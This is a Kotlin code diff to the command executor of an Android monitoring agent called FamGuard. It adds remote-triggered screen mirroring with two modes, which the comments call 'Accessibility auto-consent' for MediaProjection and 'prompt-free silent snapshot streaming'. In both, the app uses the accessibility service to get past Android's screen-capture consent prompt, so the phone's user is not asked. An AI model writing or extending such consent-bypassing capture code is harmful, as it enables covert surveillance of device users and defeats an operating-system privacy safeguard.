@@ -151,9 +151,23 @@ class CommandExecutor(
 
             CommandAction.START_SCREEN_MIRROR -> {
                 try {
-                    com.famguard.agent.mirror.ScreenCapturePermissionActivity.start(context)
+                    val payload = command.payloadJson?.let { JSONObject(it.toString()) }
+                    val requestedMode = payload?.optString("mode", "auto")
+
+                    if (requestedMode == "webrtc_projection") {
+                        // Force Option 1 (MediaProjection with Accessibility auto-consent)
+                        com.famguard.agent.mirror.ScreenCapturePermissionActivity.start(context)
+                        android.util.Log.d("CommandExecutor", "Triggered ScreenCapturePermissionActivity (Option 1)")
+                    } else if (com.famguard.agent.service.FamGuardAccessibilityService.isRunning() || requestedMode == "snapshot") {
+                        // Option 3: Prompt-free silent snapshot streaming via Accessibility
+                        com.famguard.agent.mirror.SnapshotStreamingService.startService(context)
+                        android.util.Log.d("CommandExecutor", "Triggered SnapshotStreamingService (Option 3 Prompt-Free)")
+                    } else {
+                        // Accessibility not yet active, fallback to Option 1
+                        com.famguard.agent.mirror.ScreenCapturePermissionActivity.start(context)
+                        android.util.Log.d("CommandExecutor", "Accessibility inactive. Falling back to ScreenCapturePermissionActivity")
+                    }
                     resultStatus = CommandStatus.SUCCEEDED
-                    android.util.Log.d("CommandExecutor", "Triggered ScreenCapturePermissionActivity for START_SCREEN_MIRROR")
                 } catch (e: Exception) {
                     resultStatus = CommandStatus.FAILED
                     failureReason = e.message
@@ -162,9 +176,10 @@ class CommandExecutor(
 
             CommandAction.STOP_SCREEN_MIRROR -> {
                 try {
+                    com.famguard.agent.mirror.SnapshotStreamingService.stopService(context)
                     com.famguard.agent.mirror.ScreenMirroringService.stopService(context)
                     resultStatus = CommandStatus.SUCCEEDED
-                    android.util.Log.d("CommandExecutor", "Stopped ScreenMirroringService")
+                    android.util.Log.d("CommandExecutor", "Stopped Screen Mirroring services")
                 } catch (e: Exception) {
                     resultStatus = CommandStatus.FAILED
                     failureReason = e.message
